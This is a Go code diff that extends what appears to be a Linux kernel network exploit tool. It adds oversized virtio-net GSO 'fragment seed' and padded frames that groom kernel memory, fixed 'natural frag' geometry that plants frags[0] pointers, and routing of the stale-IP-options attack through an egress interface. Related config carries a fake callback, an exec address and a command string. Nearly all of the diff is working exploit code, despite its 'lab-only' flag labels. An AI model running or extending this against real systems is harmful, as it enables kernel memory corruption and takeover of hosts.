@@ -53,55 +53,61 @@ func main() {
 }
 
 type cfg struct {
-	head          int
-	rest          int
-	tebar         int
-	tebarFill     byte
-	capture       time.Duration
-	count         int
-	page          bool
-	skipVerify    bool
-	egress        bool
-	egressRest    int
-	iface         string
-	dst           string
-	src           string
-	gateway       string
-	dstMAC        string
-	egressWait    time.Duration
-	egressSpray   int
-	egressFill    byte
-	sprayDelay    time.Duration
-	vlanTags      int
-	answerDstARP  bool
-	transport     string
-	udpSrcPort    int
-	udpPort       int
-	tcpSrcPort    int
-	tcpPort       int
-	tcpValid      bool
-	tcpEcho       bool
-	staleOptions  bool
-	staleOptSkip  int
-	staleOptLen   int
-	staleGroom    bool
-	staleGrooms   int
-	staleDelay    time.Duration
-	staleEach     time.Duration
-	staleHold     bool
-	staleHead     uint64
-	staleFragPage uint64
-	staleFragFile string
-	staleSKB      uint64
-	staleDev      uint64
-	staleHeadFile string
-	staleCallback uint64
-	staleCopyLen  int
-	staleExec     uint64
-	staleNoop     uint64
-	staleCommand  string
-	csumOffset    int
-	csumWord      uint
+	head             int
+	rest             int
+	tebar            int
+	tebarFill        byte
+	capture          time.Duration
+	count            int
+	page             bool
+	skipVerify       bool
+	egress           bool
+	egressRest       int
+	iface            string
+	dst              string
+	src              string
+	gateway          string
+	dstMAC           string
+	egressWait       time.Duration
+	egressSpray      int
+	egressFill       byte
+	sprayDelay       time.Duration
+	vlanTags         int
+	answerDstARP     bool
+	transport        string
+	udpSrcPort       int
+	udpPort          int
+	tcpSrcPort       int
+	tcpPort          int
+	tcpValid         bool
+	tcpEcho          bool
+	staleOptions     bool
+	staleOptSkip     int
+	staleOptLen      int
+	staleGroom       bool
+	staleGrooms      int
+	staleDelay       time.Duration
+	staleEach        time.Duration
+	staleHold        bool
+	staleHead        uint64
+	staleFragPage    uint64
+	staleFragFile    string
+	staleFragSeeds   int
+	staleFragSeedLen int
+	staleFragPadLen  int
+	staleFragGSOType int
+	staleFragHdrLen  int
+	staleNaturalFrag bool
+	staleSKB         uint64
+	staleDev         uint64
+	staleHeadFile    string
+	staleCallback    uint64
+	staleCopyLen     int
+	staleExec        uint64
+	staleNoop        uint64
+	staleCommand     string
+	csumOffset       int
+	csumWord         uint
 }
 
 func parseCfg() cfg {
@@ -144,6 +150,12 @@ func parseCfg() cfg {
 	flag.Uint64Var(&c.staleHead, "stale-groom-head", 0, "lab-only: predicted victim skb head address for fake ubuf_info")
 	flag.Uint64Var(&c.staleFragPage, "stale-groom-frag-page", 0, "lab-only: seed frags[0] with an observed struct page pointer")
 	flag.StringVar(&c.staleFragFile, "stale-groom-frag-page-file", "", "lab-only: two-stage mode; wait for an observed task_frag struct page pointer")
+	flag.IntVar(&c.staleFragSeeds, "stale-frag-seed-count", 0, "lab-only: write oversized GSO frames whose host skb heads contain genuine frags[0]")
+	flag.IntVar(&c.staleFragSeedLen, "stale-frag-seed-len", 8192, "lab-only: oversized GSO seed frame length")
+	flag.IntVar(&c.staleFragPadLen, "stale-frag-pad-len", 0, "lab-only: pad the short middle fragment into an oversized GSO frame")
+	flag.IntVar(&c.staleFragGSOType, "stale-frag-gso-type", 1, "lab-only: virtio-net GSO type used by oversized fragment probes")
+	flag.IntVar(&c.staleFragHdrLen, "stale-frag-hdr-len", 70, "lab-only: linear header length requested for oversized fragment probes")
+	flag.BoolVar(&c.staleNaturalFrag, "stale-natural-frag", false, "use the address-independent jumbo-fragment geometry that naturally plants frags[0]")
 	flag.Uint64Var(&c.staleSKB, "stale-groom-skb", 0, "lab-only: optional observed victim sk_buff address for calibration diagnostics")
 	flag.Uint64Var(&c.staleDev, "stale-groom-dev", 0, "lab-only: optional observed victim net_device address for calibration diagnostics")
 	flag.StringVar(&c.staleHeadFile, "stale-groom-head-file", "", "lab-only: two-stage mode; wait for a file containing the probed victim head address")
@@ -163,6 +175,9 @@ func parseCfg() cfg {
 	c.staleDelay = time.Duration(*staleDelayMs) * time.Millisecond
 	c.staleEach = time.Duration(*staleEachUS) * time.Microsecond
 	c.egressWait = time.Duration(*egressWaitMs) * time.Millisecond
+	if c.staleNaturalFrag {
+		applyStaleNaturalFrag(&c)
+	}
 	if c.head < 8 || c.head%8 != 0 || c.head > 40 {
 		fmt.Fprintln(os.Stderr, "-head must be a multiple of 8 in 8..40")
 		os.Exit(1)
@@ -227,8 +242,12 @@ func parseCfg() cfg {
 		fmt.Fprintln(os.Stderr, "-tcp-echo-options requires -tcp-valid-checksum")
 		os.Exit(1)
 	}
-	if c.staleOptions && c.egress {
-		fmt.Fprintln(os.Stderr, "-stale-options-write is available only in the prepared TAP lab")
+	if c.staleNaturalFrag && !c.staleOptions {
+		fmt.Fprintln(os.Stderr, "-stale-natural-frag requires -stale-options-write")
+		os.Exit(1)
+	}
+	if c.staleOptions && c.egress && !c.staleNaturalFrag {
+		fmt.Fprintln(os.Stderr, "egress stale-options mode requires -stale-natural-frag")
 		os.Exit(1)
 	}
 	if c.staleOptions && c.staleOptSkip != 0 && (c.staleOptSkip < 2 || c.staleOptSkip > 6) {
@@ -267,6 +286,26 @@ func parseCfg() cfg {
 		fmt.Fprintln(os.Stderr, "-stale-groom-frag-page must be a 64-byte-aligned struct page pointer")
 		os.Exit(1)
 	}
+	if c.staleFragSeeds < 0 || c.staleFragSeeds > 4096 || c.staleFragSeedLen < 4096 || c.staleFragSeedLen > 65525 {
+		fmt.Fprintln(os.Stderr, "stale fragment seed count must be 0..4096 and length 4096..65525")
+		os.Exit(1)
+	}
+	if c.staleFragSeeds != 0 && (!c.staleOptions || !c.page) {
+		fmt.Fprintln(os.Stderr, "-stale-frag-seed-count requires -stale-options-write -page")
+		os.Exit(1)
+	}
+	if c.staleFragPadLen != 0 && (c.staleFragPadLen < 4096 || c.staleFragPadLen > 65525 || !c.staleOptions || (!c.page && !c.egress)) {
+		fmt.Fprintln(os.Stderr, "-stale-frag-pad-len must be 0 or 4096..65525 and requires -stale-options-write -page")
+		os.Exit(1)
+	}
+	if c.staleFragGSOType < 0 || c.staleFragGSOType > 5 {
+		fmt.Fprintln(os.Stderr, "-stale-frag-gso-type must be in 0..5")
+		os.Exit(1)
+	}
+	if c.staleFragHdrLen < 14 || c.staleFragHdrLen > 384 {
+		fmt.Fprintln(os.Stderr, "-stale-frag-hdr-len must be in 14..384")
+		os.Exit(1)
+	}
 	if c.staleCopyLen < 0 || c.staleCopyLen > 80 || (c.staleCopyLen != 0 && c.staleCallback == 0) {
 		fmt.Fprintln(os.Stderr, "-stale-copy-len must be in 0..80 and requires stale groom head/head-file plus callback")
 		os.Exit(1)
@@ -299,8 +338,21 @@ func parseCfg() cfg {
 	return c
 }
 
+func applyStaleNaturalFrag(c *cfg) {
+	c.page = true
+	c.vlanTags = 69
+	c.staleOptSkip = 6
+	c.staleOptLen = 7
+	c.staleFragPadLen = 33086
+	c.staleFragGSOType = 0
+	c.staleFragHdrLen = 318
+}
+
 func run(c cfg) error {
 	if c.egress {
+		if c.staleOptions {
+			return runStaleOptionsEgress(c)
+		}
 		return runEgress(c)
 	}
 	tapName := getenv("PWN_TAP", "bengskytap")
@@ -435,6 +487,16 @@ func waitForKernelAddresses(path string, timeout time.Duration) ([]uint64, error
 }
 
 func runStaleOptionsAttempt(tap *os.File, cap *capture, c cfg) error {
+	if c.staleFragSeeds != 0 {
+		frame := staleFragSeedFrame(c.staleFragSeedLen, 0x73)
+		for i := 0; i < c.staleFragSeeds; i++ {
+			if err := writeTapGSO(tap, frame, byte(c.staleFragGSOType), uint16(c.staleFragHdrLen), 1400, true, 34, 16); err != nil {
+				return fmt.Errorf("stale-options: fragment seed %d/%d: %w", i+1, c.staleFragSeeds, err)
+			}
+		}
+		fmt.Printf("stale-options: fragment seeds=%d frame_len=%d gso_type=%d gso_hdr_len=%d gso_size=1400\n",
+			c.staleFragSeeds, c.staleFragSeedLen, c.staleFragGSOType, c.staleFragHdrLen)
+	}
 	if c.staleGroom {
 		var hold *capture
 		if c.staleHold {
@@ -507,8 +569,16 @@ func runStaleOptionsAttempt(tap *os.File, cap *capture, c cfg) error {
 		frameWithVLAN(ipv4PacketWithOptions(8, true, shortPayload, id, nil), c.vlanTags),
 		frameWithVLAN(ipv4PacketWithOptions(16, false, finalPayload, id, nil), c.vlanTags),
 	}
-	for _, f := range frames {
-		if err := writeTap(tap, f, true, uint16(l2LenForTags(c.vlanTags)+ipLen), 0); err != nil {
+	for i, f := range frames {
+		var err error
+		if i == 0 && c.staleFragPadLen != 0 {
+			f = stalePaddedGSOFrame(f, c.staleFragPadLen, 0x74)
+			err = writeTapGSO(tap, f, byte(c.staleFragGSOType), uint16(c.staleFragHdrLen), 1400,
+				true, uint16(l2LenForTags(c.vlanTags)+ipLen), 0)
+		} else {
+			err = writeTap(tap, f, true, uint16(l2LenForTags(c.vlanTags)+ipLen), 0)
+		}
+		if err != nil {
 			return err
 		}
 	}
@@ -518,8 +588,8 @@ func runStaleOptionsAttempt(tap *os.File, cap *capture, c cfg) error {
 	}
 
 	pkts := cap.collect(c.capture, id)
-	fmt.Printf("stale-options: original_ihl=15 deferred_word=0x%04x option_skip=%d option_len=%d fragments=%d page=%t vlan_tags=%d groom=%t groom_count=%d groom_each=%s groom_delay=%s groom_hold=%t\n",
-		desired, c.staleOptSkip, c.staleOptLen, len(pkts), c.page, c.vlanTags, c.staleGroom, c.staleGrooms, c.staleEach, c.staleDelay, c.staleHold)
+	fmt.Printf("stale-options: original_ihl=15 deferred_word=0x%04x option_skip=%d option_len=%d fragments=%d page=%t vlan_tags=%d groom=%t groom_count=%d groom_each=%s groom_delay=%s groom_hold=%t frag_pad_len=%d\n",
+		desired, c.staleOptSkip, c.staleOptLen, len(pkts), c.page, c.vlanTags, c.staleGroom, c.staleGrooms, c.staleEach, c.staleDelay, c.staleHold, c.staleFragPadLen)
 	for i, ip := range pkts {
 		if len(ip) < ipLen {
 			continue
@@ -677,6 +747,20 @@ func stalePageGroomFrame(fill byte, victimHead, fragPage, _, _, callback uint64,
 	return frame, nil
 }
 
+func staleFragSeedFrame(length int, fill byte) []byte {
+	frame := bytesRepeat(length, fill)
+	copy(frame[0:6], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x01})
+	copy(frame[6:12], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x02})
+	binary.BigEndian.PutUint16(frame[12:14], ethPExperiment)
+	return frame
+}
+
+func stalePaddedGSOFrame(frame []byte, length int, fill byte) []byte {
+	padded := bytesRepeat(length, fill)
+	copy(padded, frame)
+	return padded
+}
+
 func solvePacketChecksumAt(pkt []byte, adjust int, desired uint16) bool {
 	if adjust < 0 || adjust+1 >= len(pkt) {
 		return false
@@ -692,6 +776,11 @@ func solvePacketChecksumAt(pkt []byte, adjust int, desired uint16) bool {
 }
 
 func ipv4PacketWithOptions(offset int, more bool, payload []byte, id uint16, options []byte) []byte {
+	return ipv4PacketWithOptionsFor(offset, more, payload, id, options,
+		net.ParseIP("10.0.0.2").To4(), net.ParseIP("10.99.0.2").To4(), ipProtoRaw)
+}
+
+func ipv4PacketWithOptionsFor(offset int, more bool, payload []byte, id uint16, options []byte, src, dst net.IP, proto byte) []byte {
 	hlen := ipLen + len(options)
 	pkt := make([]byte, hlen+len(payload))
 	pkt[0] = 0x40 | byte(hlen/4)
@@ -703,9 +792,9 @@ func ipv4PacketWithOptions(offset int, more bool, payload []byte, id uint16, opt
 	}
 	binary.BigEndian.PutUint16(pkt[6:], off)
 	pkt[8] = 64
-	pkt[9] = ipProtoRaw
-	copy(pkt[12:16], net.ParseIP("10.0.0.2").To4())
-	copy(pkt[16:20], net.ParseIP("10.99.0.2").To4())
+	pkt[9] = proto
+	copy(pkt[12:16], src.To4())
+	copy(pkt[16:20], dst.To4())
 	copy(pkt[ipLen:hlen], options)
 	copy(pkt[hlen:], payload)
 	binary.BigEndian.PutUint16(pkt[10:], ipChecksum(pkt[:hlen]))
@@ -973,6 +1062,26 @@ func writeTap(tap *os.File, frame []byte, csum bool, start, offset uint16) error
 		binary.LittleEndian.PutUint16(buf[6:], start)
 		binary.LittleEndian.PutUint16(buf[8:], offset)
 	}
+	copy(buf[10:], frame)
+	for {
+		_, err := tap.Write(buf)
+		if err == nil || !errors.Is(err, syscall.EAGAIN) {
+			return err
+		}
+		time.Sleep(time.Millisecond)
+	}
+}
+
+func writeTapGSO(tap *os.File, frame []byte, gsoType byte, hdrLen, gsoSize uint16, checksum bool, csumStart, csumOffset uint16) error {
+	buf := make([]byte, 10+len(frame))
+	if checksum {
+		buf[0] = needsCsum
+		binary.LittleEndian.PutUint16(buf[6:], csumStart)
+		binary.LittleEndian.PutUint16(buf[8:], csumOffset)
+	}
+	buf[1] = gsoType
+	binary.LittleEndian.PutUint16(buf[2:], hdrLen)
+	binary.LittleEndian.PutUint16(buf[4:], gsoSize)
 	copy(buf[10:], frame)
 	for {
 		_, err := tap.Write(buf)
